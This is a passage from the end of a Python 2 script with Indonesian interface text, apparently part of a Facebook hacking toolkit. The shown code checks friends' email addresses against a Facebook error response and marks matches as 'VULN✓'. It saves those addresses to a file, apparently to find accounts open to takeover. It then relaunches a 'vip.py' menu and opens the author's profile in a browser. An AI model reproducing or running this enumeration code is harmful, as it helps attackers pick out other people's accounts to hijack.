				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
					berhasil.append(mail)
		except KeyError:
			pass
	print '\033[1;97m[\033[1;92m✓\033[1;97m] Selesai ....'
	print"\033[1;97m[\033[1;92m•\033[1;97m] Total : "+str(len(berhasil))
	print"\033[1;97m[\033[1;92m!\033[1;97m] File tersimpan : out/mailteman.txt"
	save.close()
	raw_input("\n\033[1;93m[ \033[1;97mKembali \033[1;93m]")
	os.system("python2 vip.py")
		
#######SAYA########
def saya():
	os.system ('clear')
	print logo
	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
	os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
	menu()
	
			
			
			
if __name__=='__main__':
        menu()
        masuk()